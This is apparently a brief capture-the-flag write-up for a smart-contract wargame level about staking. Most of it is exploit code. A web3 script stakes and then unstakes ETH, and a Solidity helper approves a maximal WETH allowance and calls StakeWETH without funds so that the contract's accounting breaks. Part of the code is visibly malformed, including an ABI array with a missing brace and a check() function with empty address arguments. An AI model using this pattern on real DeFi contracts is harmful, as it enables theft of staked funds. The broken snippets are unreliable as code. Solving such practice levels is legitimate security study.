## Description
Made myself a Stacker because the call will continue to be made from the contract, so that msg.sender would be mine and not the contract's. 
```
const abi = [
	{
		"inputs": [],
		"name": "StakeETH",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
		"name": "Unstake",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

const MyContract = new web3.eth.Contract(abi, contract.address);
await MyContract.methods.StakeETH().send({from:player, value: toWei("0.002")})
await MyContract.methods.Unstake(toWei('0.002')).send({from:player})
```
The next step is to approve and call StakeWETH.
```
function check()public payable {
        bytes memory data = abi.encodeWithSignature("allowance(address,address)","","");
        bytes memory data2 = abi.encodeWithSignature("approve(address,uint256)","","");
        console.logBytes(data2);
    }

    function approve()public {
        uint256 amount = type(uint64).max;
        WETH.call(abi.encodeWithSelector(0x095ea7b3, address(stake),amount));
        (address(stake)).call(abi.encodeWithSignature("StakeWETH(uint256)", amount));
    }
```

